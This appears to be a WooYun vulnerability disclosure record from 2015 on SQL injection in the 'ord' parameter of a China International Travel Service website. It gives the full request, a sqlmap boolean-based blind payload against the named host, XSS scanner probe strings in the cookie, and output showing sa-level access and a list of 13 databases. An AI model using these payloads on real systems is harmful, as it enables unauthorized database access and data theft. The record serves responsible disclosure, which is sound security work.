{"id": 84604, "wybug_id": "wooyun-2015-0144156", "wybug_title": "中国国旅某站SQL注入（SA权限/涉及多库）", "wybug_corp": "中国国旅", "wybug_author": "路人甲", "wybug_date": "2015-09-30 08:42", "wybug_open_date": "2015-11-26 09:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向公众公开  简要描述： RT 详细说明：  \nGET /line/s/leting?des=desc&gtype=1&jq=%E5%94%90%E5%B1%B1&ord=*&page=1&ts=2%E6%97%A5&type=1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://new.citsbj.com:80/Cookie: ASP.NET_SessionId=vo4uzrjvxkt2yohqmlewmn0i; tq_current_visit_time=1443451427462; tq_current_source_page_url=http://www.acunetix-referrer.com/javascript:domxssExecutionSink(0,\"'\\\"><xsstag>()refdxss\"); Hm_lvt_1c590e7a1a09b876ef4c57f58c39c807=1443453241,1443453448,1443453673,1443453790; Hm_lpvt_1c590e7a1a09b876ef4c57f58c39c807=1443453790; tq_source_page_url=http://www.acunetix-referrer.com/javascript:domxssExecutionSink(0,\"'\\\"><xsstag>()refdxss\"); SRV=38; HMACCOUNT=A5E86C9CA7909BDF; BAIDUID=A34EFC18480300DB4FDE25F46943236C:FG=1; bdshare_firstime=1443451959871Host: new.citsbj.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*ord参数存在SQL注入基于时间的盲住\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 571 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace    Payload: http://new.citsbj.com:80/line/s/leting?des=desc&gtype=1&jq=%E5%94%90%E5%B1%B1&ord=(SELECT (CASE WHEN (5002=5002) THEN 5002 ELSE 5002*(SELECT 5002 FROM master..sysdatabases) END))&page=1&ts=2%E6%97%A5&type=1    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))---web server operating system: Windows 8 or 2012web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2012current user:    'sa'current database:    'AwtripWeb'current user is DBA:    Trueavailable databases [13]:[*] APIawtripClub[*] APIawtripWeb2[*] AwtripClub[*] AwtripWeb[*] distribution[*] imageServer[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] sohotoHotelDb[*] tempdb\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-10-12 09:01 厂商回复： 非常感谢您的报告，问题已处理,十分感谢您对中国国旅的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}